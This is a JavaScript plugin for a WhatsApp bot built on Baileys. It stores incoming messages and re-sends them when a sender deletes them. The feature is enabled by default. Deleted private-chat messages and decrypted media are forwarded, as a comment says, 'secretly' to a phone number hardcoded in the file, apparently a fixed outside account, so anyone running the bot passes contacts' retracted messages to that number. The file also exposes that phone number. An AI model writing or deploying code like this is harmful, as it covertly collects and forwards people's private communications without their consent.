// 📂 File: antidelete.js
// 🛡️ Ultra Pro Max Anti-Delete System — SHABAAN GILL-MD

const fs = require("fs");
const path = require("path");
const { downloadMediaMessage } = require("@whiskeysockets/baileys");

const toggleFile = path.join(__dirname, "antidelete.json");
const OWNER_JID = "923143007893@s.whatsapp.net";

// ✅ Load or initialize toggles
let toggles = {};
if (fs.existsSync(toggleFile)) {
  try {
    toggles = JSON.parse(fs.readFileSync(toggleFile));
  } catch (e) {
    toggles = {};
  }
}

// ✅ Save toggle settings
function saveToggles() {
  try {
    fs.writeFileSync(toggleFile, JSON.stringify(toggles, null, 2));
  } catch (e) {
    console.error("❌ Failed to save antidelete toggles:", e);
  }
}

// High-speed RAM store with 1-hour automatic TTL purge
const deletedMessages = new Map();
let botId = null;

// ✅ Set Bot ID from connection
function setBotId(sock) {
  if (sock && sock.user && sock.user.id) {
    botId = sock.user.id.split(":")[0] + "@s.whatsapp.net";
  }
}

// ✅ Store message (Works in PMs, Groups, & Newsletters)
function storeMessage(msg) {
  if (!msg || !msg.key || !msg.message) return;

  const jid = msg.key.remoteJid;
  const id = msg.key.id;

  if (!jid || !id || jid === "status@broadcast") return;

  // ⛔ Skip if sender is the bot itself
  const sender = msg.key.participant || msg.key.remoteJid;
  if (msg.key.fromMe || sender === botId) return;

  if (!deletedMessages.has(jid)) {
    deletedMessages.set(jid, new Map());
  }

  deletedMessages.get(jid).set(id, msg);

  // Auto-clean message from RAM memory after 1 hour
  setTimeout(() => {
    if (deletedMessages.has(jid)) {
      deletedMessages.get(jid).delete(id);
      if (deletedMessages.get(jid).size === 0) {
        deletedMessages.delete(jid);
      }
    }
  }, 3600000);
}

// ✅ TOGGLE Command (.antidelete on/off)
async function toggleAntidelete({ conn, m, args, reply, jid }) {
  const option = (args[0] || "").toLowerCase();
  if (!["on", "off"].includes(option)) {
    const isCurrentlyActive = toggles[jid] !== false;
    return reply(
`〔 ✨ *ＡＮＴＩ－ＤＥＬＥＴＥ* ✨ 〕
┃ 🛡️ Current Status: *${isCurrentlyActive ? "ENABLED ✅" : "DISABLED ❌"}*
┃ 
┃ 💬 *Usage:*
┃    🌸 *.antidelete on*   → 𝘌𝘯𝘢𝘣𝘭ε 𝘗𝘳𝘰𝘵ε𝘤𝘵𝘪𝘰𝘯
┃    🌸 *.antidelete off*  → 𝘋𝘪𝘴𝘢𝘣𝘭ε 𝘗𝘳𝘰𝘵ε𝘤𝘵𝘪𝘰𝘯
┃ 
┃ 💡 𝘛𝘩𝘪𝘴 𝘸𝘪𝘭𝘭 𝘴𝘢𝘷ε & 𝘳ε𝘤𝘰𝘷ε𝘳
┃    𝘢𝘯𝘺 𝘥ε𝘭ε𝘵ε𝘥 𝘮ε𝘴𝘴𝘢𝘨ε𝘴 💬
╰━━━━━━━━━━━━━━━━━━╯`
    );
  }

  const enabled = option === "on";
  toggles[jid] = enabled;
  saveToggles();

  return reply(
`〔 💖 *ＡＮＴＩ－ＤＥＬＥＴＥ ＳＴＡＴＵＳ* 💖 〕
┃ 🔰 𝘗𝘳𝘰𝘵ε𝘤𝘵𝘪𝘰𝘯: *${enabled ? "ＥＮＡＢＬＥＤ ✅" : "ＤＩＳＡＢＬＥＤ ❌"}*
┃ 📌 𝘈𝘱𝘱𝘭𝘪ε𝘴 𝘵𝘰: *𝘛𝘩𝘪𝘴 𝘊𝘩𝘢𝘵*
┃ 
┃ 👑 𝑺𝒆𝒄𝒖𝒓𝒆𝒅 𝒃𝒚: ✨ 𝑺𝒉𝒂𝒃𝒂𝒂𝒏 𝑮𝒊𝒍𝒍 ✨
╰━━━━━━━━━━━━━━━━━━╯`
  );
}

// ✅ Handle Message Revocation
async function handleMessageRevocation(sock, msg) {
  try {
    const jid = msg.key?.remoteJid;

    // Safely extract revoked message ID across various Baileys protocol formats
    const protocolMsg = msg.message?.protocolMessage || msg.message?.extendedTextMessage?.contextInfo?.protocolMessage;
    const id = protocolMsg?.key?.id;

    if (!jid || !id || !deletedMessages.has(jid)) return;

    // Default to ENABLED unless explicitly turned off
    if (toggles[jid] === false) return;

    const storedMsg = deletedMessages.get(jid).get(id);
    if (!storedMsg) return;

    // ⛔ Skip if deleted message belonged to the bot
    const sender = storedMsg.key.participant || storedMsg.key.remoteJid;
    if (storedMsg.key.fromMe || sender === botId) {
      deletedMessages.get(jid).delete(id);
      return;
    }

    const isGroup = jid.endsWith("@g.us");
    const senderNum = sender.replace(/\D/g, "");
    const senderName = storedMsg.pushName || `+${senderNum}`;

    const timeStamp = new Date().toLocaleTimeString("en-US", {
      timeZone: "Asia/Karachi",
      hour: "2-digit",
      minute: "2-digit",
    });

    // 🎯 Routing logic: Group deletions stay in group; PM deletions forward secretly to owner
    const targetDestination = isGroup ? jid : OWNER_JID;

    const infoText = 
`〔 ⚠️ *ＡＮＴＩ－ＤＥＬＥＴＥ ＤＥＴＥＣＴＥＤ* ⚠️ 〕
┃ 👤 𝘚ε𝘯𝘥ε𝘳: *${senderName}* (+${senderNum})
┃ ⏰ 𝘛𝘪𝘮ε: *${timeStamp}*
┃ 📍 𝘊𝘩𝘢𝘵: *${isGroup ? "Group Chat" : "Private Direct Chat"}*
┃ 🗑️ 𝘋ε𝘭ε𝘵ε𝘥 𝘮𝘴𝘨 𝘳ε𝘤𝘰𝘷ε𝘳ε𝘥 ✨
┃ 
┃ 👑 𝑺𝒆𝒄𝒖𝒓𝒆𝒅 𝒃𝒚 𝑺𝒉𝒂𝒃𝒂𝒂𝒏 𝑮𝒊𝒍𝒍
╰━━━━━━━━━━━━━━━━━━╯`;

    const targetMsg = storedMsg.message;
    const mediaType = Object.keys(targetMsg)[0];

    // Extract text content or media captions
    const textContent =
      targetMsg.conversation ||
      targetMsg.extendedTextMessage?.text ||
      targetMsg[mediaType]?.caption ||
      "";

    // 🔹 1. Text Recovery
    if (mediaType === "conversation" || mediaType === "extendedTextMessage") {
      await sock.sendMessage(targetDestination, {
        text: `${infoText}\n\n💬 *Message:* ${textContent}`,
        mentions: [sender]
      });
    } else {
      // 🔹 2. Decrypted Media Recovery (Photo, Video, Audio, Voice Note, Document, Sticker)
      try {
        const buffer = await downloadMediaMessage(
          storedMsg,
          "buffer",
          {},
          { logger: console, reuploadRequest: sock.updateMediaMessage }
        );

        if (!buffer) {
          await sock.sendMessage(targetDestination, {
            text: `${infoText}\n\n⚠️ *Media stream unavailable.*\n💬 *Caption:* ${textContent}`
          });
        } else {
          const mime = targetMsg[mediaType]?.mimetype || "";

          if (/image/.test(mime) || mediaType === "imageMessage") {
            await sock.sendMessage(targetDestination, {
              image: buffer,
              caption: `${infoText}\n\n💬 *Caption:* ${textContent || "_None_"}`,
              mentions: [sender]
            });
          } else if (/video/.test(mime) || mediaType === "videoMessage") {
            await sock.sendMessage(targetDestination, {
              video: buffer,
              caption: `${infoText}\n\n💬 *Caption:* ${textContent || "_None_"}`,
              mentions: [sender]
            });
          } else if (/audio/.test(mime) || mediaType === "audioMessage") {
            await sock.sendMessage(targetDestination, {
              audio: buffer,
              mimetype: mime || "audio/mp4",
              ptt: targetMsg.audioMessage?.ptt || false
            });
            await sock.sendMessage(targetDestination, {
              text: `${infoText}\n\n🎙️ *Deleted Voice Note / Audio above*`
            });
          } else if (mediaType === "stickerMessage") {
            await sock.sendMessage(targetDestination, { sticker: buffer });
            await sock.sendMessage(targetDestination, {
              text: `${infoText}\n\n🏷️ *Deleted Sticker above*`
            });
          } else {
            await sock.sendMessage(targetDestination, {
              document: buffer,
              mimetype: mime || "application/octet-stream",
              fileName: targetMsg[mediaType]?.fileName || "deleted_file",
              caption: infoText
            });
          }
        }
      } catch (mediaErr) {
        console.error("❌ Media extraction error:", mediaErr);
        await sock.sendMessage(targetDestination, {
          text: `${infoText}\n\n⚠️ *Failed to decrypt attached media file.*`
        });
      }
    }

    // Clear entry from RAM memory
    deletedMessages.get(jid).delete(id);

  } catch (err) {
    console.error("❌ Antidelete Processing Error:", err);
  }
}

module.exports = {
  storeMessage,
  handleMessageRevocation,
  toggleAntidelete,
  setBotId
};
